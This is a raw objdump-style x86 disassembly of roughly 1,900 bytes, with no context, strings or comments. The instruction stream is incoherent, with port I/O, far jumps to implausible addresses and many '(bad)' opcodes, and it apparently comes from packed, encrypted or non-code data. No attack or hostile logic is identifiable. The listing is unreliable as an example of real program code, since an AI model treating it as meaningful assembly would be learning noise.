  406b4c:	push   esp
  406b4d:	test   eax,0x5ecb3d55
  406b52:	cld    
  406b53:	mov    bl,0xef
  406b55:	dec    edi
  406b56:	push   ss
  406b57:	mov    BYTE PTR [esi-0x23],dh
  406b5a:	into   
  406b5b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406b5c:	dec    edi
  406b5d:	xchg   edx,esi
  406b5f:	xchg   esp,eax
  406b60:	stos   BYTE PTR es:[edi],al
  406b61:	pop    ds
  406b62:	ins    BYTE PTR es:[edi],dx
  406b63:	cli    
  406b64:	inc    esp
  406b65:	mov    ecx,DWORD PTR [ebx+0x7ed4feb7]
  406b6b:	push   ss
  406b6c:	push   edi
  406b6d:	jg     0x406b77
  406b6f:	sbb    eax,0x5bc0d8f8
  406b74:	rcl    dh,0x29
  406b77:	and    ecx,DWORD PTR [ebx-0x60aabbf3]
  406b7d:	sahf   
  406b7e:	xor    BYTE PTR [ebp-0x5fe8a5ef],bl
  406b84:	sub    bl,cl
  406b86:	cmc    
  406b87:	adc    BYTE PTR [edi+0x4d332dd1],0xc
  406b8e:	leave  
  406b8f:	cld    
  406b90:	push   0x59
  406b92:	mov    edi,0xabe086ae
  406b97:	ficom  WORD PTR [eax-0x37]
  406b9a:	stc    
  406b9b:	imul   ebx
  406b9d:	out    dx,eax
  406b9e:	adc    eax,0x4aaaa00e
  406ba3:	test   bh,bh
  406ba5:	hlt    
  406ba6:	js     0x406b82
  406ba8:	push   ebp
  406ba9:	inc    edx
  406baa:	inc    ecx
  406bab:	shl    edi,0xff
  406bae:	jb     0x406b48
  406bb0:	scas   al,BYTE PTR es:[edi]
  406bb1:	adc    DWORD PTR [ebx+0x1c],0x74
  406bb5:	test   edi,eax
  406bb7:	out    dx,eax
  406bb8:	loopne 0x406b75
  406bba:	adc    edi,esp
  406bbc:	push   cs
  406bbd:	mov    ch,dh
  406bbf:	int    0x6d
  406bc1:	pop    eax
  406bc2:	shr    DWORD PTR [edx+edx*1+0x69961474],1
  406bc9:	lds    edx,FWORD PTR [esi]
  406bcb:	adc    cl,BYTE PTR [edi-0x78]
  406bce:	cmp    DWORD PTR [ecx],esp
  406bd0:	out    dx,al
  406bd1:	push   ecx
  406bd2:	xchg   esi,eax
  406bd3:	ins    BYTE PTR es:[edi],dx
  406bd4:	test   BYTE PTR [ecx+0x232a8256],0x4d
  406bdb:	loop   0x406b6e
  406bdd:	sbb    ch,BYTE PTR [edi]
  406bdf:	test   al,0xd1
  406be1:	shr    DWORD PTR [esi],cl
  406be3:	cmp    eax,0x35307d60
  406be8:	inc    edx
  406be9:	dec    ecx
  406bea:	or     BYTE PTR [edi-0x38],ah
  406bed:	loope  0x406c69
  406bef:	data16 fistp QWORD PTR [ebp+eiz*2-0x64baf1f1]
  406bf7:	out    0x72,al
  406bf9:	pop    ss
  406bfa:	and    ebx,esi
  406bfc:	ins    DWORD PTR es:[edi],dx
  406bfd:	fcom   QWORD PTR [ebp-0x291a0836]
  406c03:	ja     0x406c4f
  406c05:	xchg   al,al
  406c07:	jne    0x406c0d
  406c09:	loope  0x406c40
  406c0b:	std    
  406c0c:	test   bl,0xb5
  406c0f:	loop   0x406bfe
  406c11:	sub    eax,edi
  406c13:	lock leave 
  406c15:	test   al,0xc2
  406c17:	loope  0x406bd5
  406c19:	jecxz  0x406c12
  406c1b:	add    eax,0x6bc0a147
  406c20:	add    eax,0xdd805b08
  406c25:	daa    
  406c26:	adc    BYTE PTR [esi],bl
  406c28:	sub    DWORD PTR [ebx+0x7b],0x195c7146
  406c2f:	inc    ebx
  406c30:	push   esi
  406c31:	rol    BYTE PTR [ecx+0x4bbe92ed],1
  406c37:	cwde   
  406c38:	pop    ecx
  406c39:	bound  esp,QWORD PTR [edi-0x750ce9b4]
  406c3f:	sub    al,0x52
  406c41:	add    al,0x4c
  406c43:	jmp    0x6f7a6777
  406c48:	mov    esp,0xad6cf63a
  406c4d:	jbe    0x406c60
  406c4f:	or     BYTE PTR ds:0xb53c3c93,ah
  406c55:	adc    ebx,esi
  406c57:	push   cs
  406c58:	retf   
  406c59:	stc    
  406c5a:	xor    dh,BYTE PTR ds:0xdcca84e
  406c60:	xchg   ebx,eax
  406c61:	cmp    ebp,DWORD PTR [eax]
  406c63:	pop    es
  406c64:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406c65:	sbb    al,0x7d
  406c67:	repz jl 0x406c61
  406c6a:	push   ebp
  406c6b:	or     di,WORD PTR [edi]
  406c6e:	add    DWORD PTR [ecx-0x17e97298],ebp
  406c74:	sahf   
  406c75:	addr16 loopne 0x406cf4
  406c78:	in     eax,dx
  406c79:	push   edi
  406c7a:	shl    BYTE PTR [esi],0x30
  406c7d:	jge    0x406cf8
  406c7f:	lods   eax,DWORD PTR ds:[esi]
  406c80:	repz fabs 
  406c83:	adc    al,0x60
  406c85:	ins    BYTE PTR es:[edi],dx
  406c86:	add    BYTE PTR [esi+0x6b],ch
  406c89:	out    0x71,eax
  406c8b:	push   edi
  406c8c:	div    BYTE PTR ss:[edi-0x74]
  406c90:	add    DWORD PTR [esi],esp
  406c92:	aas    
  406c93:	mov    esi,0xec7101cf
  406c98:	pop    eax
  406c99:	fistp  DWORD PTR [ecx]
  406c9b:	std    
  406c9c:	and    DWORD PTR [edx+0x75],eax
  406c9f:	fld    TBYTE PTR [ecx+0x61e4975d]
  406ca5:	push   edi
  406ca6:	(bad)  
  406ca7:	js     0x406cb2
  406ca9:	mov    esp,0xa6daa4d1
  406cae:	mov    DWORD PTR [ecx+0x48],0x615691b1
  406cb5:	xchg   ebp,eax
  406cb6:	inc    esp
  406cb7:	shr    DWORD PTR [eax],cl
  406cb9:	call   0x92d7c7a9
  406cbe:	ja     0x406c8b
  406cc0:	mov    al,ds:0x19364429
  406cc5:	(bad)  
  406cc6:	pop    ss
  406cc7:	and    ch,0xa3
  406cca:	test   ecx,eax
  406ccc:	js     0x406c9c
  406cce:	ss int3 
  406cd0:	mov    ebp,0x304d06ae
  406cd5:	or     ebp,ebx
  406cd7:	sbb    bl,BYTE PTR [edi-0x7a]
  406cda:	jns    0x406d10
  406cdc:	es pop edi
  406cde:	jle    0x406cd0
  406ce0:	sar    DWORD PTR [edi-0x71],0xa9
  406ce4:	jno    0x406cf4
  406ce6:	or     eax,0xddcbf57
  406ceb:	inc    ecx
  406cec:	jnp    0x406cc1
  406cee:	or     DWORD PTR [edx+0x24],eax
  406cf1:	lods   eax,DWORD PTR ds:[esi]
  406cf2:	imul   edx,DWORD PTR ds:0x19a2a8ae,0xa0a47a2f
  406cfc:	(bad)  
  406cfd:	outs   dx,DWORD PTR ds:[esi]
  406cfe:	cmc    
  406cff:	push   edi
  406d00:	mov    ds:0x48fbb151,eax
  406d05:	sti    
  406d06:	mul    BYTE PTR [eax]
  406d08:	imul   BYTE PTR [ebp-0x61]
  406d0b:	jae    0x406cf4
  406d0d:	test   DWORD PTR ds:[esi+0x1f5ea034],esi
  406d14:	in     eax,dx
  406d15:	or     esp,edi
  406d17:	and    eax,0xa1568a35
  406d1c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406d1d:	pusha  
  406d1e:	icebp  
  406d1f:	nop
  406d20:	pop    es
  406d21:	inc    edi
  406d22:	fnsave [ebx+0xc]
  406d25:	push   ss
  406d26:	ror    dl,cl
  406d28:	sbb    eax,0xc925207a
  406d2d:	sub    BYTE PTR [eax-0x40],cl
  406d30:	and    DWORD PTR [ebx-0xc],ecx
  406d33:	fld    DWORD PTR [esp+ebx*4+0xe]
  406d37:	or     BYTE PTR [ebx+0x42],dl
  406d3a:	(bad)
  406d3e:	dec    ebp
  406d3f:	call   0xa6144c
  406d44:	mov    ecx,0x5b0377b1
  406d49:	and    al,0x4b
  406d4b:	jno    0x406d01
  406d4d:	(bad)  
  406d4e:	and    ebx,ebx
  406d50:	jb     0x406d67
  406d52:	rol    BYTE PTR [esi],1
  406d54:	ss push ebx
  406d56:	aam    0xea
  406d58:	jmp    ebx
  406d5a:	popf   
  406d5b:	pop    ebx
  406d5c:	push   ds
  406d5d:	mov    BYTE PTR [ebx],dh
  406d5f:	mov    eax,0x71afdd99
  406d64:	gs retf 
  406d66:	add    DWORD PTR [ebx+esi*1],ebp
  406d69:	xchg   DWORD PTR [eax+0x483a8f0b],esi
  406d6f:	inc    esi
  406d70:	repz xor BYTE PTR [eax-0x146a8711],al
  406d77:	stos   DWORD PTR es:[edi],eax
  406d78:	retf   0xcbe6
  406d7b:	enter  0x9cd8,0x1b
  406d7f:	xchg   edi,eax
  406d80:	ja     0x406d49
  406d82:	popa   
  406d83:	gs xchg edi,eax
  406d85:	jl     0x406de2
  406d87:	sbb    ch,cl
  406d89:	xor    esi,DWORD PTR [edx]
  406d8b:	aad    0x51
  406d8d:	adc    al,0x35
  406d8f:	fnstenv [ebp-0xd]
  406d92:	cld    
  406d93:	into   
  406d94:	xchg   esp,eax
  406d95:	inc    ebx
  406d96:	add    BYTE PTR [edi-0x4a],dl
  406d99:	xchg   esi,eax
  406d9a:	outs   dx,DWORD PTR ds:[esi]
  406d9b:	mov    cl,0x82
  406d9d:	mov    ecx,0xd49171eb
  406da2:	lds    ebx,FWORD PTR [ebx]
  406da4:	pusha  
  406da5:	push   edi
  406da6:	hlt    
  406da7:	les    edi,FWORD PTR [esi]
  406da9:	call   0xaac8:0x66c460a4
  406db0:	xchg   ecx,eax
  406db1:	arpl   WORD PTR [edx+ebp*8-0x2949222e],sp
  406db8:	xor    edi,DWORD PTR [ebp+0xcb4e2ba]
  406dbe:	aam    0xf5
  406dc0:	mov    BYTE PTR [eax+0x75e5f7d3],cl
  406dc6:	sar    DWORD PTR ds:[edi+0x4f],cl
  406dca:	push   ecx
  406dcb:	scas   al,BYTE PTR es:[edi]
  406dcc:	test   BYTE PTR [ebx-0x6f],dl
  406dcf:	sub    al,BYTE PTR [esi+0x56]
  406dd2:	jg     0x406d90
  406dd4:	mov    eax,ds:0xd89a8edf
  406dd9:	cwde   
  406dda:	sbb    eax,eax
  406ddc:	popa   
  406ddd:	outs   dx,DWORD PTR ds:[esi]
  406dde:	scas   eax,DWORD PTR es:[edi]
  406ddf:	push   esi
  406de0:	out    dx,eax
  406de1:	dec    edx
  406de2:	and    eax,0x7d503d11
  406de7:	pushf  
  406de8:	out    dx,eax
  406de9:	dec    esp
  406dea:	pop    ss
  406deb:	dec    edx
  406dec:	mov    esi,0xb3ce2efb
  406df1:	fldenv [esi+0x444458ad]
  406df7:	arpl   WORD PTR [eax-0x4eff04b9],di
  406dfd:	aam    0x45
  406dff:	pop    edx
  406e00:	fwait
  406e01:	jp     0x406dff
  406e03:	into   
  406e04:	fsub   DWORD PTR [eax+0x68]
  406e07:	int    0x86
  406e09:	cli    
  406e0a:	adc    DWORD PTR [ebx*1-0x55fa7f67],ecx
  406e11:	repz cmp BYTE PTR ss:[edi-0x2b18c5d8],0x8d
  406e1a:	pop    ds
  406e1b:	and    dl,BYTE PTR [esi-0x2e]
  406e1e:	add    eax,0x7732f9e
  406e23:	mov    esp,0xb7b6687e
  406e28:	adc    al,0x91
  406e2a:	je     0x406dcd
  406e2c:	test   eax,0x69408fa0
  406e31:	jp     0x406e4c
  406e33:	xchg   edi,eax
  406e34:	fisttp QWORD PTR [edi]
  406e36:	xchg   ebp,eax
  406e37:	mov    al,ds:0x158313e8
  406e3c:	pop    ebp
  406e3d:	loopne 0x406e76
  406e3f:	out    dx,al
  406e40:	jp     0x406e2b
  406e42:	cmp    BYTE PTR [ebp+0x7e],ah
  406e45:	(bad)  [esi+0x5f]
  406e48:	add    esi,ebp
  406e4a:	jns    0x406ea7
  406e4c:	neg    DWORD PTR [esi+0x7c]
  406e4f:	mov    bl,cl
  406e51:	mov    ebx,DWORD PTR [eax]
  406e53:	adc    eax,0xb757022a
  406e58:	cld    
  406e59:	inc    edi
  406e5a:	out    0x81,eax
  406e5c:	je     0x406e3f
  406e5e:	imul   edi,DWORD PTR [ebx],0x41e02010
  406e64:	mov    ebp,0x6d785eab
  406e69:	or     bl,cl
  406e6b:	lahf   
  406e6c:	xchg   edi,eax
  406e6d:	retf   0x20b7
  406e70:	and    esi,ebp
  406e72:	mov    WORD PTR [ebx+0x1c],ss
  406e75:	rcl    BYTE PTR [ebx+ebp*2-0xe395d5],1
  406e7c:	dec    esi
  406e7d:	mov    ebp,0x40e160bf
  406e82:	pop    esp
  406e83:	xchg   ebp,eax
  406e84:	pop    ds
  406e85:	sar    DWORD PTR [esi-0x33747a30],cl
  406e8b:	loop   0x406e69
  406e8d:	xchg   edi,eax
  406e8e:	xor    ebp,DWORD PTR [eax+ebp*4]
  406e91:	fucom  st(0)
  406e93:	test   al,0xcd
  406e95:	cmp    BYTE PTR ds:0x949ecc2b,dh
  406e9b:	imul   BYTE PTR [ecx+0x56c21be1]
  406ea1:	stos   BYTE PTR es:[edi],al
  406ea2:	mov    edx,0x2b1f09d8
  406ea7:	ss pop ecx
  406ea9:	sub    BYTE PTR [eax-0x74],ch
  406eac:	jae    0x406ebb
  406eae:	pop    edx
  406eaf:	xchg   ebp,eax
  406eb0:	dec    ebx
  406eb1:	arpl   WORD PTR [edi+0x309a9d9d],bp
  406eb7:	fsubr  DWORD PTR [esi-0x2e]
  406eba:	inc    edi
  406ebb:	mov    dl,0x30
  406ebd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406ebe:	push   esp
  406ebf:	jg     0x406e4f
  406ec1:	repnz or BYTE PTR [ebp+0x4f16fc50],dh
  406ec8:	std    
  406ec9:	scas   al,BYTE PTR es:[edi]
  406eca:	and    BYTE PTR [ebp-0x10],cl
  406ecd:	icebp  
  406ece:	retf   0x8133
  406ed1:	xchg   DWORD PTR [ecx-0x4617c74d],edx
  406ed7:	mov    edx,gs
  406ed9:	add    DWORD PTR [ebp-0x72c1d],0x7a
  406ee0:	adc    BYTE PTR [ebx+0x58],dh
  406ee3:	mov    gs,WORD PTR [ebx+0x57]
  406ee6:	sub    DWORD PTR cs:[eax],edx
  406ee9:	push   eax
  406eea:	xchg   esp,eax
  406eeb:	fcmovnb st,st(3)
  406eed:	cli    
  406eee:	mov    bl,0x92
  406ef0:	mov    edx,0xf2d66042
  406ef5:	sub    esp,DWORD PTR [ebp-0x74ecdafd]
  406efb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406efc:	dec    esi
  406efd:	es (bad) 
  406eff:	push   ebx
  406f00:	ret    0x385f
  406f03:	cdq    
  406f04:	add    DWORD PTR [ecx+0x14],eax
  406f07:	je     0x406edb
  406f09:	xor    ecx,eax
  406f0b:	ret    
  406f0c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406f0d:	push   edi
  406f0e:	mov    dl,0x1e
  406f10:	in     al,dx
  406f11:	lods   al,BYTE PTR ds:[esi]
  406f12:	mov    ds:0x872b8150,al
  406f17:	pop    edx
  406f18:	rcr    BYTE PTR [eax],cl
  406f1a:	fcmovu st,st(5)
  406f1c:	mov    bh,BYTE PTR [esp+ebp*2+0x46]
  406f20:	sti    
  406f21:	enter  0x62cc,0x50
  406f25:	les    esp,FWORD PTR [edx+0x72]
  406f28:	push   edx
  406f29:	push   ss
  406f2a:	xchg   esp,eax
  406f2b:	pop    edx
  406f2c:	xchg   edi,eax
  406f2d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406f2e:	add    DWORD PTR [ebx],ebp
  406f30:	push   ecx
  406f31:	xchg   ebx,eax
  406f32:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406f33:	mov    cl,0x1
  406f35:	xor    ebx,DWORD PTR [esi+ecx*2]
  406f38:	cmp    al,0x76
  406f3a:	in     al,dx
  406f3b:	pusha  
  406f3c:	lods   eax,DWORD PTR ds:[esi]
  406f3d:	mov    dh,0x55
  406f3f:	ja     0x406f32
  406f41:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406f42:	jp     0x406efa
  406f44:	(bad)  
  406f45:	sti    
  406f46:	cmovg  edx,esi
  406f49:	xchg   BYTE PTR [ebp+0x6b],ch
  406f4c:	and    al,BYTE PTR [ebx-0x3b]
  406f4f:	fimul  WORD PTR [ebp-0x13]
  406f52:	shl    DWORD PTR [ebp+0x34],cl
  406f55:	mov    edx,fs
  406f57:	in     eax,0x34
  406f59:	clc    
  406f5a:	push   esi
  406f5b:	pop    esi
  406f5c:	iret   
  406f5d:	push   esp
  406f5e:	adc    al,0xa
  406f60:	sbb    al,0x93
  406f62:	sti    
  406f63:	and    DWORD PTR [ebp+0x78fe8a5b],edi
  406f69:	(bad)  
  406f6a:	sar    BYTE PTR [eax-0x1d],cl
  406f6d:	adc    dh,BYTE PTR [esi-0x7e]
  406f70:	and    eax,0x4d3ae1e2
  406f75:	adc    eax,0x974f4335
  406f7a:	aam    0xe7
  406f7c:	leave  
  406f7d:	aaa    
  406f7e:	jno    0x406fd3
  406f80:	inc    edx
  406f81:	shl    edx,cl
  406f83:	pop    ecx
  406f84:	mov    cs,WORD PTR [ebp+0x32]
  406f87:	cdq    
  406f88:	scas   eax,DWORD PTR es:[edi]
  406f89:	js     0x406f9f
  406f8b:	mov    ecx,0x78af455
  406f90:	int3   
  406f91:	pop    DWORD PTR [edi+0x68f6c1aa]
  406f97:	sbb    DWORD PTR [esi],ecx
  406f99:	das    
  406f9a:	shl    ah,0x20
  406f9d:	outs   dx,BYTE PTR ds:[esi]
  406f9e:	jmp    0x974d:0x78f66e43
  406fa5:	(bad)  [ebx+0x5a9a85ba]
  406fab:	dec    edx
  406fac:	repnz sub cl,BYTE PTR [ebp+0x76]
  406fb0:	out    dx,al
  406fb1:	and    cl,BYTE PTR [edi+0x7f0740c2]
  406fb7:	sub    al,0x4c
  406fb9:	inc    edx
  406fba:	into   
  406fbb:	inc    edi
  406fbc:	sub    ah,al
  406fbe:	or     al,0xfa
  406fc0:	jnp    0x407035
  406fc2:	inc    esp
  406fc3:	and    DWORD PTR [esi],0x7d
  406fc6:	int    0x9c
  406fc8:	pop    es
  406fc9:	sbb    ebx,DWORD PTR [edx+0x25de7313]
  406fcf:	std    
  406fd0:	leave  
  406fd1:	dec    edx
  406fd2:	or     eax,0xaf68508d
  406fd7:	mov    BYTE PTR [edx+0x34],bh
  406fda:	inc    esi
  406fdb:	dec    esp
  406fdc:	rcr    DWORD PTR [edi+0x3cb31c91],0xf7
  406fe3:	ret    
  406fe4:	in     eax,0x56
  406fe6:	mov    ds:0xa3b4a2f5,eax
  406feb:	test   DWORD PTR [ecx-0x12af5b6a],ebp
  406ff1:	dec    esi
  406ff2:	pop    ecx
  406ff3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406ff4:	mov    bl,0xfe
  406ff6:	mov    eax,ds:0xa58c6996
  406ffb:	(bad)  
  406ffc:	ror    esi,1
  406ffe:	jb     0x407010
  407000:	ds and al,0xfd
  407003:	inc    edi
  407004:	adc    BYTE PTR [eax],bl
  407006:	xlat   BYTE PTR ds:[ebx]
  407007:	rcl    al,cl
  407009:	fsub   st(0),st
  40700b:	pop    eax
  40700c:	pop    edi
  40700d:	dec    esi
  40700e:	test   ecx,edi
  407010:	jns    0x407021
  407012:	aam    0x1a
  407014:	(bad)  
  407015:	ror    BYTE PTR [edi-0x4a3c0ea0],cl
  40701b:	mov    BYTE PTR [edi-0x22],ah
  40701e:	mov    eax,ds:0x99f64dfd
  407023:	stos   DWORD PTR es:[edi],eax
  407024:	xor    BYTE PTR [esi+0x30d57b5f],bl
  40702a:	xlat   BYTE PTR ds:[ebx]
  40702b:	mov    esi,0x64bf5889
  407030:	and    ebx,DWORD PTR [edi-0x5e]
  407033:	dec    ebx
  407034:	push   ebx
  407035:	pusha  
  407036:	mul    BYTE PTR [ecx+0x1b]
  407039:	sti    
  40703a:	dec    edx
  40703b:	or     eax,DWORD PTR [ebx]
  40703d:	inc    ebp
  40703e:	shl    BYTE PTR [eax+0x462e8d93],cl
  407044:	dec    ebx
  407045:	(bad)  
  407047:	fs sahf 
  407049:	inc    ebp
  40704a:	adc    BYTE PTR [edx-0x2d],al
  40704d:	dec    eax
  40704e:	dec    ecx
  40704f:	in     eax,dx
  407050:	int    0xf
  407052:	repnz mov dh,0xa0
  407055:	cmp    al,BYTE PTR [edx]
  407057:	jle    0x406ff1
  407059:	mov    al,0x50
  40705b:	sub    ecx,DWORD PTR [ebx-0x47]
  40705e:	sub    eax,ebx
  407060:	push   eax
  407061:	in     al,dx
  407062:	mov    ecx,0xfe137d1d
  407067:	and    bl,BYTE PTR [edx]
  407069:	cmp    al,0x52
  40706b:	pop    ebp
  40706c:	imul   edx,DWORD PTR [eax+0xa],0xe7edc312
  407073:	adc    al,0xb0
  407075:	pop    ss
  407076:	fmul   DWORD PTR [ecx+ebp*8]
  407079:	xchg   ebx,eax
  40707a:	xbegin 0xfd72a898
  407080:	pop    edx
  407081:	cmp    DWORD PTR [esi-0x7320e605],eax
  407087:	cmp    eax,0x6dd7081c
  40708c:	xor    edi,DWORD PTR [esi-0x55]
  40708f:	ja     0x4070aa
  407091:	inc    edi
  407092:	scas   eax,DWORD PTR es:[edi]
  407093:	and    eax,eax
  407095:	xor    DWORD PTR [esi+0x8820a50],0xfffffffc
  40709c:	(bad)  
  40709d:	loopne 0x407041
  40709f:	sub    DWORD PTR [edx],esi
  4070a1:	cmp    eax,0x917e9188
  4070a6:	sub    al,dl
  4070a8:	push   ds
  4070a9:	aad    0xab
  4070ab:	ret    
  4070ac:	es dec edx
  4070ae:	lds    ecx,FWORD PTR [ecx+0x3a60aeb2]
  4070b4:	dec    edi
  4070b5:	mov    al,ds:0xf75a9b32
  4070ba:	fidivr DWORD PTR [ebx]
  4070bc:	jge    0x40706a
  4070be:	pop    edx
  4070bf:	or     DWORD PTR [edx],esi
  4070c1:	pop    eax
  4070c2:	sbb    ebp,DWORD PTR [esi-0x12]
  4070c5:	pop    esp
  4070c6:	js     0x407124
  4070c8:	ins    DWORD PTR es:[edi],dx
  4070c9:	loopne 0x40712d
  4070cb:	xchg   ebp,eax
  4070cc:	test   al,0x8a
  4070ce:	xor    BYTE PTR [edx+0x2c20674c],bl
  4070d4:	push   edx
  4070d5:	shl    BYTE PTR [ecx+0x776b25e3],0x3e
  4070dc:	push   edi
  4070dd:	das    
  4070de:	jmp    0x7c45c66
  4070e3:	pop    edx
  4070e4:	shr    edx,1
  4070e6:	sub    DWORD PTR [edi+0x11],edx
  4070e9:	jno    0x4070c5
  4070eb:	sub    al,0x60
  4070ed:	out    0x14,al
  4070ef:	xor    eax,0x96a6ef4f
  4070f4:	cmp    eax,0xbab31990
  4070f9:	add    eax,0xea58a30c
  4070fe:	aam    0xa5
  407100:	fwait
  407101:	adc    DWORD PTR [edx-0x2c937993],0x3f
  407108:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407109:	push   0xd1918336
  40710e:	je     0x4070e1
  407110:	outs   dx,BYTE PTR ds:[esi]
  407111:	inc    ebx
  407112:	shl    BYTE PTR [ebx+0x34e82dc8],cl
  407118:	scas   eax,DWORD PTR es:[edi]
  407119:	out    dx,eax
  40711a:	ficomp WORD PTR [ebx-0x35c5f3b7]
  407120:	cmp    esi,DWORD PTR [eax]
  407122:	cmc    
  407123:	cmc    
  407124:	xor    ebp,DWORD PTR [edx]
  407126:	pop    ds
  407127:	stc    
  407128:	js     0x407186
  40712a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40712b:	fcmovnu st,st(3)
  40712d:	inc    ebp
  40712e:	pusha  
  40712f:	dec    edx
  407130:	sub    DWORD PTR [edi],edi
  407132:	xor    ah,dl
  407134:	mov    ds:0x42981b88,al
  407139:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40713a:	pop    es
  40713b:	fwait
  40713c:	and    eax,0x3f5bb45a
  407141:	int3   
  407142:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407143:	(bad)  
  407144:	push   0x41ac5310
  407149:	mov    ch,0x59
  40714b:	mov    bl,0x8e
  40714d:	and    dh,BYTE PTR [ecx-0x7d75dfcd]
  407153:	adc    eax,0xb282ee81
  407158:	xor    DWORD PTR [edx],ebx
  40715a:	cmp    DWORD PTR [ecx+edx*1-0x4],ebp
  40715e:	dec    eax
  40715f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407160:	sub    ecx,ebp
  407162:	shl    esi,0xe6
  407165:	mov    ds:0x2cd09387,al
  40716a:	mov    BYTE PTR [edx-0x25],ah
  40716d:	shr    DWORD PTR [edi],cl
  40716f:	retf   
  407170:	ror    DWORD PTR [edx+0x6cbc81b],0x35
  407177:	ja     0x4070f9
  407179:	fstp   DWORD PTR [edx]
  40717b:	or     DWORD PTR [edi+0x46],esp
  40717e:	retf   
  40717f:	scas   eax,DWORD PTR es:[edi]
  407180:	psrad  mm4,QWORD PTR [edx]
  407183:	lods   al,BYTE PTR ds:[esi]
  407184:	and    BYTE PTR [edi-0x408b1a13],dl
  40718a:	add    ebp,DWORD PTR [ebx+0x13]
  40718d:	daa    
  40718e:	das    
  40718f:	lock adc BYTE PTR [esi],0x1a
  407193:	shl    al,cl
  407195:	adc    DWORD PTR [edi+edx*4+0x3a],esp
  407199:	xchg   esi,eax
  40719a:	adc    al,0x4d
  40719c:	sub    BYTE PTR [edi],0x7f
  40719f:	in     eax,0xdc
  4071a1:	xor    ebp,eax
  4071a3:	je     0x4071f1
  4071a5:	inc    eax
  4071a6:	mov    edx,0x5fdd1da5
  4071ab:	cmp    BYTE PTR [edi*1-0x8d4b5f7],bh
  4071b2:	(bad)  [esi]
  4071b4:	mov    ebx,0x958cdcf2
  4071b9:	and    eax,0xa7954b5c
  4071be:	mov    esp,0x27083c7a
  4071c3:	mov    edx,0xe6eff7c
  4071c8:	or     BYTE PTR [edx],dh
  4071ca:	or     DWORD PTR [esi-0x5],ebp
  4071cd:	push   esp
  4071ce:	inc    eax
  4071cf:	adc    eax,0xda8501d
  4071d4:	dec    esp
  4071d5:	jns    0x4071c9
  4071d7:	repz jnp 0x4071e9
  4071da:	dec    esp
  4071db:	mov    ebp,0x702a7509
  4071e0:	push   0xe74b0599
  4071e5:	sbb    dl,dh
  4071e7:	jnp    0x4071a1
  4071e9:	xor    BYTE PTR [edi],0xe8
  4071ec:	push   0x9c695b28
  4071f1:	jge    0x4071ad
  4071f3:	popf   
  4071f4:	adc    esp,DWORD PTR [ecx-0x21edb50a]
  4071fa:	mov    bh,0xd0
  4071fc:	sub    BYTE PTR [ebp+0x66b4cdd6],dh
  407202:	ins    DWORD PTR es:[edi],dx
  407203:	call   0x9108e6cb
  407208:	cmp    ebx,DWORD PTR [esi-0x7c89500e]
  40720e:	mov    esp,0x6a572259
  407213:	xchg   BYTE PTR [esi+0x56],dl
  407216:	and    DWORD PTR [ecx],esp
  407218:	enter  0x3d46,0xf
  40721c:	iret   
  40721d:	neg    DWORD PTR [ecx+0x7168830]
  407223:	sbb    BYTE PTR ds:0xf561c969,0x39
  40722a:	pop    esi
  40722b:	sub    BYTE PTR [edx-0x276f5508],0x1e
  407232:	jmp    0x407205
  407234:	mov    cs,WORD PTR [eax-0x688cb6aa]
  40723a:	and    al,0x3c
  40723c:	jb     0x407246
  40723e:	(bad)  
  40723f:	cmp    cl,BYTE PTR [edi-0x1c]
  407242:	inc    ebp
  407243:	leave  
  407244:	addr16 cmp al,0x4e
  407247:	lsl    edx,si
  40724a:	cmp    ah,cl
  40724c:	sub    dh,BYTE PTR [edx-0x612e07e5]
  407252:	mov    edi,ebp
  407254:	cwde   
  407255:	std    
  407256:	daa    
  407257:	push   eax
  407258:	pshufw mm4,QWORD PTR [ebx+0x615b1b55],0xb8
  407260:	in     eax,dx
  407261:	jnp    0x4072b7
  407263:	add    al,0x98
  407265:	push   ebp
  407266:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407267:	aad    0x98
  407269:	std    
  40726a:	aas    
  40726b:	xor    esi,edi
  40726d:	xor    ah,BYTE PTR [ebx-0x40]
  407270:	dec    edx
  407271:	outs   dx,DWORD PTR ds:[esi]
  407272:	mov    cl,cl
  407274:	rcr    DWORD PTR [esi],1
  407276:	popa   
  407277:	clc    
  407278:	cmp    DWORD PTR [ebp-0x1a],ebp
  40727b:	or     BYTE PTR [esp+eax*1-0x23d6891b],dl
  407282:	hlt    
  407283:	int3   
  407284:	jp     0x407244
  407286:	xchg   ebp,eax
  407287:	or     BYTE PTR [edx+0x3e],dh
  40728a:	mov    dh,0xc7
  40728c:	sub    edi,DWORD PTR [ebp-0x4f665543]
  407292:	fdivr  QWORD PTR [ebx-0x52]
  407295:	and    edi,edx
  407297:	scas   eax,DWORD PTR es:[edi]
  407298:	jo     0x4072d7
  40729a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40729b:	xchg   esi,eax
  40729c:	(bad)  
  40729d:	cmp    esi,DWORD PTR [eax-0x54]
  4072a0:	adc    eax,0xb8def12
  4072a5:	in     eax,dx
  4072a6:	int    0x17
  4072a8:	mov    dl,0x93
  4072aa:	mov    ebx,ebp
  4072ac:	inc    ebp
  4072ad:	mov    ds:0x930c780c,al
  4072b2:	adc    dh,BYTE PTR [ebp-0x1]
  4072b5:	(bad)  
  4072b7:	cli    
  4072b8:	rcr    DWORD PTR [edx+0x54dd8199],0x37
  4072bf:	and    al,BYTE PTR [edx]
  4072c1:	jecxz  0x4072e9
  4072c3:	sub    edi,esp
  4072c5:	sub    ebp,DWORD PTR ss:[esi+0x19]
  4072c9:	mov    eax,0xe4445b33
  4072ce:	pop    eax
  4072cf:	cmp    al,0xa7
  4072d1:	rcr    BYTE PTR [ecx],0x35
  4072d4:	push   0xffffffdb
  4072d6:	and    al,0x63
